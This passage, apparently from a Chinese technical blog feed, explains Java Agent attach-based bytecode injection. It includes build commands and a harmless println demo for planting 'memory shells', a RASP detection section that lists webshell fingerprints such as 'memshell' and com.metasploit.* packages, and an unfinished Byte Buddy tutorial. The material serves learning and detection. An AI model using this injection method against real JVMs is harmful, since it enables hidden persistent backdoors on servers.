class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 1.编译源文件</span><br><span class="line">javac -d out -cp ./javassist-3.28.0-GA.jar src/com/agent/*.java</span><br><span class="line"># 如果出现编码错误，加上-encoding UTF-8进行编码</span><br><span class="line">javac -encoding UTF-8 -d out -cp ./javassist-3.28.0-GA.jar src/com/agent/*.java</span><br><span class="line"></span><br><span class="line"># 2. 将 javassist 库的内容解压缩</span><br><span class="line">mkdir temp-javassist</span><br><span class="line">cd temp-javassist</span><br><span class="line">jar xf ../javassist-3.28.0-GA.jar</span><br><span class="line"></span><br><span class="line"># 将 javassist 和编译后的类文件一起打包，或者直接把javassist文件夹放到out目录下(z去掉后面的-C javassist .)</span><br><span class="line">cd ..</span><br><span class="line">jar cvfm agent.jar src/com/agent/MANIFEST.MF -C out . -C javassist .</span><br></pre></td></tr></table></figure><blockquote><p>注意：</p><ul><li><p>这里需要使用javassist.jar包进行字节码的改写，可以使用maven下载javassist.jar，也可以直接去<a href="https://repo1.maven.org/maven2/javassist/javassist/3.9.0.GA/">网站下载</a>。但是我通过网站下载到的jar包中的对应修改功能模块一直不能被代码识别，建议还是和我一样使用maven下载的javassist.jar包</p></li><li><p>同时，最好删除掉之前生成过的out文件，不然的话后续生成的jar包里面会包含之前生成的class文件</p></li><li><p>这里新建一个temp-javassist的目的是：后续添加到agent.jar包中的javassist相关class类文件都在javassist文件夹下，代码中的 <code>import javassist.*;</code> 会找不到javassist模块。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20241115172027516.png" alt="image-20241115172027516" /></p></li></ul><p>-cp 表示连接外部jar，因为这里使用到了外部的javassist.jar</p><p>可以使用下面的命令查看jar包内容，确定是否成功打包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar tf agent.jar</span><br></pre></td></tr></table></figure><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20241115185440522.png" alt="image-20241115185440522" /></p></blockquote></li><li><p><strong>编写 <code>attacher.jar</code></strong></p><p>通过pid将java agent attach到目标JVM，然后通过LoadAgent加载指定的jar文件</p><p><strong><code>AgentAttach.java</code></strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">package com.attacher;</span><br><span class="line"></span><br><span class="line">import com.sun.tools.attach.AgentInitializationException;</span><br><span class="line">import com.sun.tools.attach.AgentLoadException;</span><br><span class="line">import com.sun.tools.attach.AttachNotSupportedException;</span><br><span class="line">import com.sun.tools.attach.VirtualMachine;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class AgentAttach &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException &#123;</span><br><span class="line">        String id = args[0];  // 获取目标 JVM 的 PID</span><br><span class="line">        String jarName = args[1];  // 要注入的 Java Agent 的 jar 文件路径</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;id ==&gt; &quot; + id);</span><br><span class="line">        System.out.println(&quot;jarName ==&gt; &quot; + jarName);</span><br><span class="line"></span><br><span class="line">        // Attach 到指定的 JVM 进程</span><br><span class="line">        VirtualMachine virtualMachine = VirtualMachine.attach(id);</span><br><span class="line"></span><br><span class="line">        // 加载 Java Agent</span><br><span class="line">        virtualMachine.loadAgent(jarName);</span><br><span class="line"></span><br><span class="line">        // Detach 后释放与目标 JVM 的连接</span><br><span class="line">        virtualMachine.detach();</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;ends&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong><code>MANIFEST.MF</code></strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Main-Class: com.attacher.AgentAttach</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>类似的，编译打包成 <code>attacher.jar</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 1. 编译</span><br><span class="line">javac -d out src/com/attacher/*.java</span><br><span class="line"></span><br><span class="line"># 2. 打包</span><br><span class="line">jar cvfm attacher.jar src/com/attacher/MANIFEST.MF -C out .</span><br></pre></td></tr></table></figure></li><li><p><strong>Agent 注入</strong></p><p>启动目标程序：在终端中运行 <code>hello.jar</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar hello.jar</span><br></pre></td></tr></table></figure><p>可以看到对应输出的JVM的name和PID。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20241109000130195.png" alt="image-20241109000130195" /></p><p><strong>注入 <code>agent.jar</code></strong>：在另一个终端中运行以下命令，通过Attach API 将 Java Agent (<code>agent.jar</code>)  动态注入到 <code>hello.jar</code> 的 JVM 上。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 29976为目标JVM的[PID]</span><br><span class="line">java -jar attacher.jar 29976 &quot;./agent.jar&quot;</span><br></pre></td></tr></table></figure><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20241109000159066.png" alt="image-20241109000159066" /></p><p>输出&quot;java memory shell&quot;，成功将 <code>System.out.println(&quot;java memory shell&quot;);</code> 对应的字节码修改为 <code>System.out.println(&quot;java memory shell&quot;);</code></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20241109000318944.png" alt="image-20241109000318944" /></p></li><li><p><strong>注入内存马</strong></p><p>将 <code>System.out.println(&quot;java memory shell&quot;);</code>  替换为想要执行的内存马代码即可。修改哪个类的哪个方法，是注入内存马的前提和关键。我们需要利用上述方法，将木马注入到<strong>某个一定会执行</strong>的方法内。</p><p>后门的本质就是在目标上留下一个用户可控的参数，黑客通过控制这个参数，达到执行任意系统命令的目的。因此，想要注入内存马，就必然绕不开 request 和 response，因此大多的内存马将目标放在FilterChain上面，通过修改Filter来注入恶意代码</p></li></ol><h1 id="rasp检测"><a class="markdownIt-Anchor" href="#rasp检测"></a> RASP检测</h1><p>与注入内存马一样，我们同样可以利用Java的Instrument机制，动态注入我们的检测Agent，获取JVM中所有已加载的Class，匹配内存马特有的可疑特征，让隐藏的内存马现出原型。</p><p>检测步骤：</p><ul><li>1）Attach检测Agent到JVM进程</li><li>2）获取JVM中已经加载的Class列表</li><li>3）根据指纹特征将可疑的Class反编译为Java源码</li><li>4）根据源码检测出Webshell</li></ul><p>所以，我们需要分析常见的内存马存在的一些可疑的特征，比如：</p><p>Agent通过加载Transformer实现功能，Transformer继承ClassFileTransformer接口</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20241109003250776.png" alt="image-20241109003250776" /></p><p>常见的特征包括：</p><ul><li>继承可能实现webshell功能的接口<ul><li>javax.servlet.http.HttpServlet</li><li>org.springframework.web.servlet.handler.AbstractHandlerMapping</li><li>javax.servlet.Filter</li><li>javax.servlet.Servlet</li><li>javax.servlet.ServletRequestListener</li><li>…</li></ul></li><li>名字<ul><li>shell</li><li>memshell</li><li>…</li></ul></li><li>常见已知的Webshell包名：<ul><li>net.rebeyond.*</li><li>com.metasploit.*</li><li>…</li></ul></li></ul><h1 id="相关技术"><a class="markdownIt-Anchor" href="#相关技术"></a> 相关技术</h1><h2 id="修改字节码"><a class="markdownIt-Anchor" href="#修改字节码"></a> 修改字节码</h2><h3 id="javassist"><a class="markdownIt-Anchor" href="#javassist"></a> Javassist</h3><p>修改字节码的技术有很多，比如 ASM、Javassist、BCEL、CGLib 等，这里仅简要介绍 Javassist。Javassist 可以直接用 Java 编码来实现增强，无需关注字节码结构，比 ASM 更简单。Javassist 中核心的类主要有四个：</p><ul><li>CtClass：类信息</li><li>ClassPool：可以从中获取 CtClass，key 为类的全限定名</li><li>CtMethod：方法信息</li><li>CtField：字段信息</li></ul><p>基于这四个类，可以方便地实现增强，比如在指定方法前后增加代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取默认 ClassPool</span></span><br><span class="line"><span class="type">ClassPool</span> <span class="variable">cp</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="comment">// 找到 CtClass，重写 com.nsfocus.Demo</span></span><br><span class="line"><span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> cp.get(<span class="string">&quot;com.nsfocus.Demo&quot;</span>);</span><br><span class="line"><span class="comment">// 增强方法 test</span></span><br><span class="line"><span class="type">CtMethod</span> <span class="variable">m</span> <span class="operator">=</span> cc.getDeclaredMethod(<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="comment">// 前面插入代码</span></span><br><span class="line">m.insertBefore(<span class="string">&quot;&#123; System.out.println(\&quot;javassist start\&quot;); &#125;&quot;</span>);</span><br><span class="line"><span class="comment">// 后面插入代码</span></span><br><span class="line">m.insertAfter(<span class="string">&quot;&#123; System.out.println(\&quot;javassist end\&quot;); &#125;&quot;</span>);</span><br><span class="line"><span class="comment">// Java agent 获取字节码数据</span></span><br><span class="line"><span class="keyword">return</span> cc.toBytecode();</span><br></pre></td></tr></table></figure><p><a href="https://www.html.cn/softprog/java/111251780565900.html">Javassist用法详解</a></p><h3 id="例子"><a class="markdownIt-Anchor" href="#例子"></a> 例子</h3><p>创建 <code>HelloWorld.java</code>, <code>hello.java</code>, <code>GetPid.java</code> 三个java文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">// HelloWorld.java</span><br><span class="line">package com.test;</span><br><span class="line"></span><br><span class="line">import java.util.Scanner;</span><br><span class="line"></span><br><span class="line">public class HelloWorld &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        hello h1 = new hello();</span><br><span class="line">        GetPid pid = new GetPid();</span><br><span class="line">        h1.hello();</span><br><span class="line">        // 输出当前进程的 pid</span><br><span class="line">        pid.GetPid();</span><br><span class="line">        // 产生中断，等待注入</span><br><span class="line">        Scanner sc = new Scanner(System.in);</span><br><span class="line">        sc.nextInt();</span><br><span class="line">        hello h2 = new hello();</span><br><span class="line">        h2.hello();</span><br><span class="line">        System.out.println(&quot;ends...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// hello.java</span><br><span class="line">package com.test;</span><br><span class="line"></span><br><span class="line">public class hello &#123;</span><br><span class="line">    public void hello() &#123;</span><br><span class="line">        System.out.println(&quot;hello world&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//GetPid.java</span><br><span class="line">package com.test;</span><br><span class="line"></span><br><span class="line">import java.lang.management.ManagementFactory;</span><br><span class="line"></span><br><span class="line">public class GetPid &#123;</span><br><span class="line">    public void GetPid() &#123;</span><br><span class="line">        String name = ManagementFactory.getRuntimeMXBean().getName();</span><br><span class="line">        System.out.println(&quot;JVM：&quot; + name);</span><br><span class="line">        String pid = name.split(&quot;@&quot;)[0];</span><br><span class="line">        System.out.println(&quot;PID：&quot; + pid);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="参考资料"><a class="markdownIt-Anchor" href="#参考资料"></a> 参考资料</h1><ul><li>Instrumentation的使用：<a href="https://su18.org/post/irP0RsYK1/">Java Instrumentation</a></li><li><a href="https://www.cnblogs.com/nongchaoer/p/15561936.html">JavaWeb 内存马一周目通关攻略</a></li><li><a href="https://www.freebuf.com/articles/web/331954.html">Java Agent 内存马攻防 - FreeBuf网络安全行业门户</a></li><li><a href="https://www.anquanke.com/post/id/274443#h2-0">主机安全技术剖析-手把手教会你防御Java内存马-安全客 - 安全资讯平台</a></li><li><a href="https://www.freebuf.com/articles/web/197823.html">浅谈RASP技术攻防之基础篇 - FreeBuf网络安全行业门户</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java内存马 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java内存马 </tag>
            
            <tag> RASP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『Java』Java Agent开发</title>
      <link href="/posts/111e.html"/>
      <url>/posts/111e.html</url>
      
        <content type="html"><![CDATA[<p>在项目中使用到了Java Agent技术开发RASP检测框架，本文主要记录对Java Agent的学习过程</p><h2 id="java-agent介绍"><a class="markdownIt-Anchor" href="#java-agent介绍"></a> Java Agent介绍</h2><p>Java Agent 是一种基于 <code>java.lang.instrument</code> 包的技术，可以在 JVM 启动时或运行时加载代理代码，修改目标类的字节码。它主要用于 AOP（面向切面编程）、性能监控、日志收集、测试工具、应用安全等场景。</p><p>Java Agent 可以在两种模式下运行：</p><ul><li><strong>启动时代理 (premain)</strong> ：在 JVM 启动时加载。</li><li><strong>运行时代理 (agentmain)</strong> ：在 JVM 启动后动态加载。</li></ul><h3 id="基本结构"><a class="markdownIt-Anchor" href="#基本结构"></a> 基本结构</h3><p>一个 Java Agent （已打包好的Jar文件）包含以下几个关键部分：</p><ul><li><strong>Manifest 文件</strong>：定义了代理类的入口方法。</li><li><strong>代理类</strong>：包含 <code>premain</code> 或 <code>agentmain</code> 方法，用于执行字节码操作。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleAgent</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span> &#123; </span><br><span class="line">        System.out.println(<span class="string">&quot;SimpleAgent premain called with args: &quot;</span> + agentArgs);</span><br><span class="line">        <span class="comment">// 你可以在这里添加对类的字节码修改逻辑 </span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>premain</code> 方法是代理类的入口，<code>Instrumentation</code> 接口提供了修改字节码的能力。</p><p>在 Java Agent 的 JAR 包中，<code>META-INF/MANIFEST.MF</code> 文件需要包含以下内容来指定代理类：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">Premain-Class: SimpleAgent</span></span><br></pre></td></tr></table></figure><h3 id="工作原理"><a class="markdownIt-Anchor" href="#工作原理"></a> 工作原理</h3><h4 id="intrumentation接口"><a class="markdownIt-Anchor" href="#intrumentation接口"></a> Intrumentation接口</h4><p>Java Agent 的核心在于 <code>Instrumentation</code> 接口，它提供了修改类定义和字节码的能力。JVM 在加载类时，Java Agent 可以通过 <code>ClassFileTransformer</code> 接口动态修改类的字节码。</p><p><code>Instrumentation</code> 接口的关键功能包括：</p><ul><li><strong>添加字节码转换器</strong>: <code>addTransformer(ClassFileTransformer transformer)</code> 方法允许代理添加自定义的字节码转换器。</li><li><strong>重新定义类</strong>: <code>redefineClasses(ClassDefinition... definitions)</code> 方法允许重新定义已经加载的类。</li><li><strong>查看类信息</strong>: 提供方法来查看 JVM 中加载的所有类、获取类的大小、获取类加载器等信息。</li></ul><h4 id="classfiletransformer接口"><a class="markdownIt-Anchor" href="#classfiletransformer接口"></a> ClassFileTransformer接口</h4><p>其中<code>ClassFileTransformer</code> 接口用于定义字节码转换器，它包含一个方法 <code>transform</code>，在类加载时调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">    <span class="type">byte</span>[] transform(</span><br><span class="line">        ClassLoader loader,</span><br><span class="line">        String className,</span><br><span class="line">        Class&lt;?&gt; classBeingRedefined,</span><br><span class="line">        ProtectionDomain protectionDomain,</span><br><span class="line">        <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><strong>classfileBuffer</strong>：类的字节码数组。</li><li><strong>transform</strong> 方法返回修改后的字节码，如果不需要修改，返回 <code>null</code> 即可。</li></ul><h4 id="类加载过程中的字节码转换"><a class="markdownIt-Anchor" href="#类加载过程中的字节码转换"></a> 类加载过程中的字节码转换</h4><p>当 JVM 加载一个类时，<code>ClassFileTransformer</code> 的 <code>transform</code> 方法会被调用。开发者可以在这个方法中修改类的字节码，例如增加日志、性能监控代码，甚至可以在类中注入新的方法或字段。</p><h4 id="启动时和运行时代理"><a class="markdownIt-Anchor" href="#启动时和运行时代理"></a> 启动时和运行时代理</h4><ul><li><strong>启动时代理 (premain)</strong> ：代理在 JVM 启动时加载，允许修改所有即将加载的类。</li><li><strong>运行时代理 (agentmain)</strong> ：代理在 JVM 运行过程中通过 <code>Attach API</code> 动态加载，允许修改已加载的类。</li></ul><p><code>agentmain</code> 方法的使用方式与 <code>premain</code> 类似，不同的是它在 JVM 运行时被调用。</p><h2 id="byte-buddy"><a class="markdownIt-Anchor" href="#byte-buddy"></a> Byte Buddy</h2><p>在Java Agent技术的框架下，常用的框架有以下几个：</p><ol><li><strong>Byte Buddy</strong>: 这是一个强大的库，用于在运行时创建和修改Java类。Byte Buddy提供了一个简单易用的API，用于生成、修改和加载Java字节码。它支持Java 5及更高版本，并且与Java Agent技术非常配合。</li><li><strong>ASM</strong>: ASM是一个Java字节码操控框架。它能直接生成或以二进制形式修改已有类或者核心类的字节码。ASM可以直接生成字节码，而不需要了解Java虚拟机指令。ASM比其他的Java字节码操控框架（例如Javassist, BCEL, CGLIB）更快更小。</li><li><strong>Javassist</strong>: Javassist是一个开源的分析、编辑和创建Java字节码的库。它已经被许多其他的Java类库和工具使用，包括Hibernate和Spring。Javassist是分析字节码的工具，并且提供了一个简单的API来操作和生成字节码。</li><li><strong>Instrumentation API</strong>: 这是Java Agent技术的核心API，用于在运行时修改类的字节码。使用这个API，你可以实现自己的类加载器，并在类被加载到JVM时修改其字节码。</li><li><strong>HotSwapAgent</strong>: HotSwapAgent是一个Java类重新加载器，它支持在不停止和重启JVM的情况下重新加载已修改的类。HotSwapAgent基于Java Instrumentation API，并提供了更多的功能，如条件断点、类变量查看和修改等。</li></ol><h3 id="byte-buddy语法"><a class="markdownIt-Anchor" href="#byte-buddy语法"></a> Byte Buddy语法</h3><p>任何一个由 Byte Buddy 创建/增强的类型都是通过 ByteBuddy 类的实例来完成的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DynamicType.Unloaded&lt;?&gt; dynamicType = <span class="keyword">new</span> <span class="title class_">ByteBuddy</span>()</span><br><span class="line">        <span class="comment">// 生成 Object的子类</span></span><br><span class="line">        .subclass(Object.class)</span><br><span class="line">        <span class="comment">// 生成类的名称为&quot;com.itheima.Type&quot;</span></span><br><span class="line">        .name(<span class="string">&quot;com.itheima.Type&quot;</span>)</span><br><span class="line">        .make();</span><br></pre></td></tr></table></figure><h4 id="动态增强代码"><a class="markdownIt-Anchor" href="#动态增强代码"></a> 动态增强代码</h4><p>Byte Buddy 动态增强代码总共有三种方式：</p><ul><li><strong>subclass</strong>：对应 <code>ByteBuddy.subclass()</code> 方法。这种方式比较好理解，就是为目标类（即被增强的类）生成一个子类，在子类方法中插入动态代码。</li><li><strong>rebasing</strong>：对应 ByteBuddy.rebasing() 方法。当使用 rebasing 方式增强一个类时，Byte Buddy 保存目标类中所有方法的实现，也就是说，当 Byte Buddy 遇到冲突的字段或方法时，会将原来的字段或方法实现复制到具有兼容签名的重新命名的私有方法中，而不会抛弃这些字段和方法实现。从而达到不丢失实现的目的。这些重命名的方法可以继续通过重命名后的名称进行调用。</li><li><strong>redefinition</strong>：对应 ByteBuddy.redefine() 方法。当重定义一个类时，Byte Buddy 可以对一个已有的类添加属性和方法，或者删除已经存在的方法实现。如果使用其他的方法实现替换已经存在的方法实现，则原来存在的方法实现就会消失。</li></ul><h5 id="subclass"><a class="markdownIt-Anchor" href="#subclass"></a> subclass</h5><p>利用以下代码创建一个目标类<code>Object</code>的子类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">ByteBuddy</span>()</span><br><span class="line">        .subclass(Object.class)</span><br><span class="line">        .method(ElementMatchers.named(<span class="string">&quot;toString&quot;</span>))</span><br><span class="line">        .intercept(FixedValue.value(<span class="string">&quot;Hello World!&quot;</span>))</span><br><span class="line">        .make()</span><br><span class="line">        .saveIn(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;result&quot;</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上述代码创建了一个<code>Object</code>的子类并且创建了<code>toString</code>方法输出<code>Hello World!</code> 通过找到保存的输出类我们可以看到最后的类是这样的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> net.bytebuddy.renamed.java.lang;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Object$ByteBuddy$tPSTnhZh</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object$ByteBuddy$tPSTnhZh() &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到虽然创建了一个类，但是我们没有为这个类取名，通过结果得知最后的类名是 <code>net.bytebuddy.renamed.java.lang.Object$ByteBuddy$tPSTnhZh</code></p><p>在ByteBuddy中如果没有指定类名，他会调用默认的<code>NamingStrategy</code>策略来生成类名，一般情况下为</p><blockquote><p>父类的全限定名 + <code>$ByteBuddy$</code> + 随机字符串<br />例如： org.example.MyTest<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi><mi>y</mi><mi>t</mi><mi>e</mi><mi>B</mi><mi>u</mi><mi>d</mi><mi>d</mi><mi>y</mi></mrow><annotation encoding="application/x-tex">ByteBuddy</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mord mathnormal">u</span><span class="mord mathnormal">d</span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span>NsT9pB6w</p></blockquote><p>如果父类是java.lang目录下的类，例如Object，那么会变成</p><blockquote><p><code>net.bytebuddy.renamed.</code> + 父类的全限定名 + <code>$ByteBuddy$ </code>+ 随机字符串<br />例如： net.bytebuddy.renamed.java.lang.Object$ByteBuddy$2VOeD4Lh</p></blockquote><h5 id="rebiasing"><a class="markdownIt-Anchor" href="#rebiasing"></a> rebiasing</h5><p>首先定义一个类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.bytebuddy.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClassTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;my test&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>rebasing代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; dynamicType = <span class="keyword">new</span> <span class="title class_">ByteBuddy</span>()</span><br><span class="line">            .rebase(MyClassTest.class)</span><br><span class="line">            .method(ElementMatchers.named(<span class="string">&quot;test&quot;</span>))</span><br><span class="line">            .intercept(FixedValue.value(<span class="string">&quot;Hello World!&quot;</span>))</span><br><span class="line">            .make()</span><br><span class="line">            .load(String.class.getClassLoader()).getLoaded();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>rebasing后</p><p><img src="https://cdn.nlark.com/yuque/0/2025/webp/46256686/1739798765474-5c5a36fa-5e5b-41d6-9cd3-03f2449f2a5e.webp" alt="" /></p><p>可以看到原先的方法被重命名后保留了下来，并且变成了私有方法。</p><h5 id="redefinition"><a class="markdownIt-Anchor" href="#redefinition"></a> redefinition</h5><p>rebasing操作和redefinition操作最大的区别就是rebasing操作不会丢失原先的类的方法信息。大致的实现原理是在变基操作的时候把所有的方法实现复制到重新命名的私有方法（具有和原先方法兼容的签名）中，这样原先的方法就不会丢失。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; dynamicType = <span class="keyword">new</span> <span class="title class_">ByteBuddy</span>()</span><br><span class="line">            .redefine(MyClassTest.class)</span><br><span class="line">            .method(ElementMatchers.named(<span class="string">&quot;test&quot;</span>))</span><br><span class="line">            .intercept(FixedValue.value(<span class="string">&quot;Hello World!&quot;</span>))</span><br><span class="line">            .make()</span><br><span class="line">            .load(String.class.getClassLoader()).getLoaded();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>redefine后</p><p><img src="https://cdn.nlark.com/yuque/0/2025/webp/46256686/1739798794987-90aa26ba-8b2d-4669-a854-dd22b115a8ac.webp" alt="" /></p><blockquote><p>注意redefinition和rebasing不能修改已经被jvm加载的类，不然会报错Class already loaded</p></blockquote><h4 id="类的加载"><a class="markdownIt-Anchor" href="#类的加载"></a> 类的加载</h4><p>通过上述三种方式完成类的增强之后，我们得到的是 <code>DynamicType.Unloaded</code> 对象，表示的是一个未加载的类型，我们可以使用 <code>ClassLoadingStrategy </code>加载此类型。Byte Buddy 提供了几种类加载策略，这些加载策略定义在 